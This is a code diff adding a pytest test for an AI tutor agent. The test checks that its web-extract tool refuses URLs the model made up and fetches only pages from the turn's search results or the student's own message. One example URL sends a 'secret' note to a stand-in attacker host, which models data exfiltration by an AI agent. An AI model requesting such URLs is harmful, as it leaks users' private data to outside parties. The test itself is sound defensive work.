@@ -5,6 +5,7 @@ from __future__ import annotations
 
 import base64
 import uuid
+from typing import Any
 
 import pytest
 from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, ToolMessage
@@ -374,3 +375,65 @@ async def test_get_page_dispatches_to_a_registered_page_kind() -> None:
         unregister_page_resolver("pdf_page")
         if shipped is not None:
             registry._PAGE_RESOLVERS["pdf_page"] = shipped
+
+
+# ── web_extract reads only pages the turn's search returned or the student typed (review14 #5) ──
+
+
+async def test_web_extract_refuses_a_url_the_model_made_up(monkeypatch: pytest.MonkeyPatch) -> None:
+    from naadi_api.agent.graphs.tutor import _turn_web_urls
+    from naadi_api.agent.tools import web
+    from naadi_api.agent.tools.executor import ToolRefused
+    from naadi_api.agent.tools.registry import PageRef, ToolContext, web_url_key
+    from naadi_api.llm import CallContext
+    from naadi_api.search import ExtractResult
+
+    fetched: list[str] = []
+
+    class FakeSearch:
+        async def extract(self, url: str, *, user_id: Any) -> ExtractResult:
+            fetched.append(url)
+            return ExtractResult(url=url, title="Page", text="page text", cached=False)
+
+    monkeypatch.setattr(web, "get_search", lambda: FakeSearch())
+
+    def tc(urls: set[str]) -> ToolContext:
+        return ToolContext(
+            user_id=uuid.uuid4(),
+            is_admin=False,
+            run_id="t",
+            thread_id=None,
+            db=None,  # type: ignore[arg-type]
+            exam_active=False,
+            page=PageRef(),
+            gateway=None,  # type: ignore[arg-type]
+            call=CallContext(purpose="chat"),
+            flags={},
+            web_allowed=True,
+            web_urls=urls,
+        )
+
+    made_up = "https://attacker.example/collect?note=secret"
+    with pytest.raises(ToolRefused, match="url_not_from_search"):
+        await web.web_extract(tc(set()), web.WebExtractArgs(url=made_up))  # type: ignore[arg-type]
+    assert fetched == []
+    returned = "https://www.ncbi.nlm.nih.gov/books/NBK1/"
+    r = await web.web_extract(tc({web_url_key(returned + "#top")}), web.WebExtractArgs(url=returned))  # type: ignore[arg-type]
+    assert fetched == [returned] and "page text" in r.content
+
+    # The allow-list: this turn's web citations and the URLs in the student's own message, nothing older.
+    state: Any = {
+        "turn_start": 2,
+        "messages": [
+            HumanMessage("old", id="h0"),
+            AIMessage("old", id="a0"),
+            HumanMessage("read https://www.cdc.gov/page. please", id="h1"),
+            AIMessage("", id="a1"),
+        ],
+        "citations": [
+            {"layer": "web", "url": "https://www.who.int/x", "message_id": "a1"},
+            {"layer": "web", "url": "https://old.example/y", "message_id": "a0"},
+            {"layer": "course", "url": "https://course.example/z", "message_id": "a1"},
+        ],
+    }
+    assert _turn_web_urls(state) == {"https://www.who.int/x", "https://www.cdc.gov/page"}
